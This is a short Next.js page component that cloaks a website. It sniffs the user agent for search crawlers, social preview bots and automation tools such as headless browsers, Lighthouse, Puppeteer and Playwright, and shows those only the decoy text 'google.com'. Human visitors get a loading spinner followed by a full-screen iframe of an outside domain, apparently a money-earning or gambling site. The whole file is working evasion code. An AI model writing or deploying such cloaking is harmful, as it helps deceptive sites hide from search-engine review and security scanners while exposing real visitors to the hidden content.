"use client";
import { useEffect, useState } from "react";

const isBot = () => {
  if (typeof navigator === "undefined") return true;

  const ua = navigator.userAgent.toLowerCase();

  return (
    ua.includes("googlebot") ||
    ua.includes("bingbot") ||
    ua.includes("yandex") ||
    ua.includes("duckduckbot") ||
    ua.includes("facebookexternalhit") ||
    ua.includes("twitterbot") ||
    ua.includes("slackbot") ||
    ua.includes("linkedinbot") ||
    ua.includes("headless") ||
    ua.includes("lighthouse") ||
    ua.includes("puppeteer") ||
    ua.includes("playwright")
  );
};

export default function Home() {
  const [showIframe, setShowIframe] = useState(false);
  const [blockIframe, setBlockIframe] = useState(false);

  useEffect(() => {
    if (isBot()) {
      setBlockIframe(true);
      return;
    }

    const timer = setTimeout(() => {
      setShowIframe(true);
    }, 2500);

    return () => clearTimeout(timer);
  }, []);

  return (
    <div className="flex min-h-screen items-center justify-center bg-white w-full h-screen">

      {!showIframe && !blockIframe && (
        <div className="flex flex-col items-center gap-2">
          <div className="animate-spin w-10 h-10 border-4 border-gray-300 border-t-black rounded-full"></div>
          {/* <p className="text-black text-sm">Loading...</p> */}
        </div>
      )}

      {!blockIframe && showIframe && (
        <iframe
          src="https://realyono.lakhokmao.com"
          className="w-full h-full"
        />
      )}

      {blockIframe && (
        <div className="text-black text-sm">
          google.com
        </div>
      )}

    </div>
  );
}